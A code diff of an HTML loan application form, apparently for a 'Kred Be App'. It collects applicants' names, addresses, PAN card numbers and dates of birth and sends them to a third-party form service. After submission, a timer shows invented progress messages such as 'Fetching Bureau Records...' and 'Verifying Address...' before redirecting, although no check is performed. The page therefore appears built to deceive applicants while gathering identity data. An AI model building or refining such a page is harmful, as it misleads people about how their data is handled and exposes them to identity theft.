@@ -141,7 +141,9 @@
         <form id="loanForm" action="https://api.web3forms.com/submit" method="POST">
             <input type="hidden" name="access_key" value="fea091d8-a631-4425-aff6-82815670893b">
             <input type="hidden" name="subject" value="New Loan Application Received">
-            <input type="hidden" name="redirect" value=""> <div style="display: flex; gap: 10px;">
+            <input type="hidden" name="from_name" value="Kred Be App">
+
+            <div style="display: flex; gap: 10px;">
                 <div class="form-group" style="flex: 1;">
                     <label>First Name</label>
                     <input type="text" name="First_Name" id="first-name" placeholder="John" required>
@@ -169,21 +171,26 @@
             <div class="form-group">
                 <label>Select State</label>
                 <select name="State" id="state-select" required>
-                    <option value="">-- Select State --</option>
+                    <option value="">-- Choose State --</option>
                     <option value="Andhra Pradesh">Andhra Pradesh</option>
                     <option value="Arunachal Pradesh">Arunachal Pradesh</option>
                     <option value="Assam">Assam</option>
                     <option value="Bihar">Bihar</option>
                     <option value="Chandigarh">Chandigarh</option>
                     <option value="Chhattisgarh">Chhattisgarh</option>
+                    <option value="Dadra and Nagar Haveli">Dadra and Nagar Haveli</option>
+                    <option value="Daman and Diu">Daman and Diu</option>
                     <option value="Delhi">Delhi</option>
                     <option value="Goa">Goa</option>
                     <option value="Gujarat">Gujarat</option>
                     <option value="Haryana">Haryana</option>
                     <option value="Himachal Pradesh">Himachal Pradesh</option>
+                    <option value="Jammu and Kashmir">Jammu and Kashmir</option>
                     <option value="Jharkhand">Jharkhand</option>
                     <option value="Karnataka">Karnataka</option>
                     <option value="Kerala">Kerala</option>
+                    <option value="Ladakh">Ladakh</option>
+                    <option value="Lakshadweep">Lakshadweep</option>
                     <option value="Madhya Pradesh">Madhya Pradesh</option>
                     <option value="Maharashtra">Maharashtra</option>
                     <option value="Manipur">Manipur</option>
@@ -205,13 +212,13 @@
             </div>
 
             <div class="form-group">
-                <label>Address Line 1</label>
-                <input type="text" name="Address_1" id="address1" placeholder="House No / Mohalla" required>
+                <label>Address Line 1 (House/Street)</label>
+                <input type="text" name="Address_Line_1" id="address1" placeholder="House No / Street" required>
             </div>
 
             <div class="form-group">
-                <label>Address Line 2</label>
-                <input type="text" name="Address_2" id="address2" placeholder="District / City" required>
+                <label>Address Line 2 (District/City)</label>
+                <input type="text" name="Address_Line_2" id="address2" placeholder="District / City" required>
             </div>
 
             <div class="form-group">
@@ -226,7 +233,7 @@
 
             <div class="form-group">
                 <label>PAN Card Number</label>
-                <input type="text" name="PAN" id="pan" placeholder="ABCDE1234F" style="text-transform: uppercase;" required>
+                <input type="text" name="PAN_Card" id="pan" placeholder="ABCDE1234F" style="text-transform: uppercase;" required>
             </div>
 
             <div class="form-group">
@@ -234,7 +241,7 @@
                 <input type="date" name="DOB" id="dob" required>
             </div>
 
-            <input type="hidden" name="Employment" id="hidden-emp">
+            <input type="hidden" name="Employment_Status" id="hidden-emp">
             <label>Employment Status</label>
             <div class="radio-group" id="emp-group">
                 <div class="radio-item" onclick="selectItem('emp', this)">Self Employed</div>
@@ -356,28 +363,32 @@
             localStorage.setItem('userLoanAmount', document.getElementById('loan-amount').value);
 
             const overlay = document.getElementById('loader-overlay');
+            const text = document.getElementById('loader-text');
             overlay.style.display = 'flex';
 
-            // Submit form data to Web3Forms
+            // Submit form data to Web3Forms API
             const form = document.getElementById('loanForm');
             const formData = new FormData(form);
             
             try {
-                const response = await fetch("https://api.web3forms.com/submit", {
+                fetch("https://api.web3forms.com/submit", {
                     method: "POST",
                     body: formData
                 });
             } catch (err) {
-                console.log("Submission error");
+                console.log("Submit error");
             }
 
-            // Normal processing steps animation
-            const steps = ["Securing Data...", "Fetching Bureau Records...", "Approving Limit..."];
+            // Processing UI steps
+            const steps = ["Securing Data...", "Fetching Bureau Records...", "Verifying Address...", "Finalizing Limit..."];
             let i = 0;
             const interval = setInterval(() => {
-                if(i < steps.length) document.getElementById('loader-text').innerText = steps[i++];
-                else { clearInterval(interval); window.location.href = "yourloanamount.html"; }
-            }, 2500);
+                if(i < steps.length) text.innerText = steps[i++];
+                else { 
+                    clearInterval(interval); 
+                    window.location.href = "yourloanamount.html"; 
+                }
+            }, 3000);
         }
 
         document.querySelectorAll('input, select, #agree').forEach(el => {
